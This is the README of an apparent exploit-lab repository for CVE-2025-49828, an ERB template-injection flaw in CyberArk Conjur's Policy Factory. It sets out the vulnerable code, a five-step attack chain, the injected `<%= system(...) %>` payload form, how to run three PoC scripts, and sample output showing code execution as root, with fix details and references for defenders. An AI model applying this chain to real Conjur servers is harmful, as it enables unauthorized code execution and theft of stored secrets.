# CVE-2025-49828 - CyberArk Conjur SSTI to RCE via ERB in Policy Factory

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-49828 |
| Component | [CyberArk Conjur](https://github.com/cyberark/conjur) |
| Type | CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |
| CVSS | 8.8 (HIGH) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.7% (71.5th percentile) |
| Affected | Conjur OSS 1.20.1–1.21.1 / Secrets Manager Self-Hosted 13.1–13.4.1 |
| Fix | v1.21.2 / v13.5 — ERB replaced with Mustache template engine |
| Discovered by | Yarden Porat and Shahar Tal (Cyata Security) |
| Author | Exploit Intelligence Platform |
| Date | 2026-03-01 |

## Vulnerability Details

CyberArk Conjur OSS (v1.20.1–1.21.1) and Secrets Manager Self-Hosted (v13.1–13.4.1) are vulnerable to Remote Code Execution via Server-Side Template Injection (SSTI) in the Policy Factory Renderer. The `Factories::Renderer` class uses Ruby's ERB (Embedded Ruby) template engine to render user-controlled factory templates, allowing an authenticated attacker to inject arbitrary Ruby code that executes within the Conjur server process.

The vulnerability resides in `app/domain/factories/renderer.rb`. The `Renderer` class accepts a `render_engine` parameter that defaults to Ruby's ERB — a full-featured template engine capable of executing arbitrary Ruby code within `<%= %>` tags. When a Policy Factory template is rendered, the template string is passed directly to `ERB.new(template, trim_mode: '-').result_with_hash(variables)`, which evaluates any embedded Ruby expressions server-side.

Factory templates are stored as Base64-encoded JSON blobs in Conjur database variables at `conjur/factories/{classification}/{version}/{name}`. Both the `policy` field (Base64-encoded ERB template) and the `policy_branch` field (plain-text ERB template) are rendered through the ERB engine without sanitization.

```ruby
# VULNERABLE CODE — app/domain/factories/renderer.rb (v1.21.1)
module Factories
  class Renderer
    def initialize(render_engine: ERB)       # ERB is the default engine
      @render_engine = render_engine
    end

    def render(template:, variables:)
      @success.new(
        @render_engine.new(template, trim_mode: '-').result_with_hash(variables)
        # ↑ SSTI: evaluates arbitrary Ruby code in template
      )
    end
  end
end
```

### Attack Chain

```
1. Authenticate as any Conjur user with variable-write permissions
2. Create a policy that defines a factory variable at conjur/factories/core/v1/<name>
3. Store a malicious factory template with ERB payload in the 'policy' or 'policy_branch' field
4. Trigger factory rendering via POST or PATCH to /factory-resources/{account}/core/v1/<name>
5. ERB.new(template).result_with_hash() evaluates the payload → RCE as root
```

### Fix

The fix in [v1.21.2](https://github.com/cyberark/conjur/releases/tag/v1.21.2) (commit [`b3c19593`](https://github.com/cyberark/conjur/commit/b3c19593f741509877347ae5e1cbfaa04ef0f259)) replaces ERB with **Mustache** — a logic-less template engine that only supports variable interpolation (`{{ }}`). The fix is thorough and complete: Mustache's template language is incapable of code execution by design. No bypass vectors were identified.

```diff
- @render_engine.new(template, trim_mode: '-').result_with_hash(variables)
+ Mustache.render(template, variables)
```

Post-render validation also rejects output containing unclosed `}}` tags, and `Mustache::Parser::SyntaxError` is caught for malformed templates.

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────┐
│              Host Machine                │
│                                          │
│  python3 poc/poc.py 127.0.0.1 3000       │
│         │                                │
│         ▼ :3000                           │
│  ┌─────────────────────────────┐         │
│  │  cve-2025-49828-vulnerable  │         │
│  │  Conjur v1.21.1 (Ruby 3.2) │         │
│  │  ERB template engine        │         │
│  └──────────┬──────────────────┘         │
│             │ DATABASE_URL               │
│  ┌──────────▼──────────────────┐         │
│  │  cve-2025-49828-pg          │         │
│  │  PostgreSQL 15              │         │
│  └─────────────────────────────┘         │
│            lab-net                        │
└──────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-49828

# Build and start
docker compose build
docker compose up -d

# Wait ~15-20s for Conjur to finish DB migrations and start
docker compose logs -f vulnerable

# Run the exploit (reads API key from container automatically)
python3 poc/poc.py 127.0.0.1 3000

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-49828-vulnerable` | Target | `ruby:3.2-slim` | `3000` | Conjur v1.21.1 with ERB renderer |
| `cve-2025-49828-pg` | Database | `postgres:15` | — | PostgreSQL backend |

### Default Credentials

| Service | Username | Password | Notes |
|---|---|---|---|
| Conjur | `admin` | `ADmin123!!!!` | Account: `cucumber` |
| Conjur API Key | — | — | Auto-generated; read via `docker exec cve-2025-49828-vulnerable cat /tmp/admin_api_key` |

## PoC Usage

Three PoC scripts demonstrate different attack vectors. All are standalone Python 3 with **no external dependencies** (stdlib only).

### Vector 1 — SSTI via `policy` field (POST)

Injects `<%= system('...') %>` into the Base64-encoded `policy` field of a factory template.

```bash
python3 poc/poc.py <conjur_host> [port] [api_key]

# Run against the lab (reads API key from container automatically):
python3 poc/poc.py 127.0.0.1 3000
```

### Vector 2 — SSTI via `policy_branch` field (POST)

Injects the ERB payload into the `policy_branch` field, which is plain text (no Base64 encoding required). Simplest vector.

```bash
python3 poc/poc_vector2_policy_branch.py 127.0.0.1 3000
```

### Vector 3 — PATCH method (same code path)

Uses PATCH instead of POST. Both methods route to the same vulnerable `create` action, demonstrating that WAF/IDS rules targeting only POST would be insufficient.

```bash
python3 poc/poc_vector3_patch_method.py 127.0.0.1 3000
```

### Expected Output (Vector 1)

```
[*] Target: http://127.0.0.1:3000
[*] CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory
[*] Vector: Malicious ERB payload in factory 'policy' field

[*] No API key provided — reading from container...
[+] Got API key: sbze4b44...6stg

[*] Authenticating as 'admin' to http://127.0.0.1:3000...
[+] Authenticated successfully. Token length: 848

[*] Loading factory infrastructure policy...
[+] Factory policy loaded (HTTP 201)

[*] Constructing malicious factory template with ERB SSTI payload...
[+] Malicious factory template stored successfully

[*] Triggering factory rendering (this executes the ERB payload)...
[*]   Factory response: HTTP 401

[*] Checking for RCE evidence file (/tmp/cve-2025-49828-pwned) in container...
[+] ============================================================
[+] RCE CONFIRMED! Contents of evidence file:
[+] ============================================================
[+]   uid=0(root) gid=0(root) groups=0(root)
[+]   8f0a688b366a
[+]   CVE-2025-49828-EXPLOITED
[+] ============================================================

[+] EXPLOIT SUCCESSFUL — CVE-2025-49828 CONFIRMED
```

> **Note on HTTP 401 response:** The factory-resources endpoint returns an error because ERB's `system()` returns `true`, which becomes the first line of the rendered "policy" text. The Conjur policy parser rejects this as invalid YAML. However, code execution occurs *before* the policy is parsed — the ERB evaluation happens in `Renderer.render()`, and the result is then passed to the policy loader. The error response is a red herring; the RCE succeeds.

## Verification: Vulnerable vs Patched

| Test | Vulnerable (v1.21.1) | Patched (v1.21.2) |
|---|---|---|
| Vector 1 — policy field | RCE confirmed (evidence file written) | `Mustache::Parser::SyntaxError` — no code execution |
| Vector 2 — policy_branch field | RCE confirmed | Literal text output — no code execution |
| Vector 3 — PATCH method | RCE confirmed | Same Mustache protection |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — SSTI via `policy` field (POST) |
| `poc/poc_vector2_policy_branch.py` | Vector 2 — SSTI via `policy_branch` field |
| `poc/poc_vector3_patch_method.py` | Vector 3 — PATCH method triggers same code path |
| `Dockerfile.vulnerable` | Conjur v1.21.1 with ERB renderer (multi-stage Ruby build) |
| `docker-compose.yml` | Two-container lab (Conjur + PostgreSQL) |
| `entrypoint.sh` | Conjur startup (migrations, account creation, server start) |
| `intel_brief.md` | CVE intelligence brief from EIP |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Full test results across all vectors |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-49828)
- [GitHub Advisory (GHSA-93hx-v9pv-qrm4)](https://github.com/cyberark/conjur/security/advisories/GHSA-93hx-v9pv-qrm4)
- [Fix Commit](https://github.com/cyberark/conjur/commit/b3c19593f741509877347ae5e1cbfaa04ef0f259)
- [Release v1.21.2](https://github.com/cyberark/conjur/releases/tag/v1.21.2)
- [OSS-Security Announcement](http://www.openwall.com/lists/oss-security/2025/07/16/7)

## Timeline

| Date | Event |
|---|---|
| 2025-07-15 | CVE-2025-49828 published; fix released in v1.21.2 / v13.5 |
| 2025-07-16 | OSS-Security mailing list announcement |
| 2025-08-08 | OSS-Security followup post |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-49828 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
